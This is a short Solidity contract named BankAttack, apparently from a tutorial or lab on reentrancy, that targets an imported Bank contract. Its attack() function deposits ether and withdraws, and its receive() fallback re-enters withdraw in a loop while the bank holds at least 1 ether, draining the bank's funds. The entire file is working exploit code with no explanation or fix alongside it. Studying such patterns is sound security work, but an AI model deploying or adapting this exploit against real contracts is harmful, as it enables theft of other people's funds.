// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.6.10;

import "./Bank.sol";

contract BankAttack {
  Bank bank;
  
  constructor(address _bank) public {
    bank = Bank(_bank);
  }

  receive() external payable {
    if (bank.getBalance() >= 1 ether){
      bank.withdraw(1 ether);
    }
  }
  function attack() external payable{
    require(msg.value >= 1 ether);
    bank.deposit{value: msg.value}();
    bank.withdraw(1 ether);
  }

  function getBalance() public view returns(uint){
    return address(this).balance;
  }
}
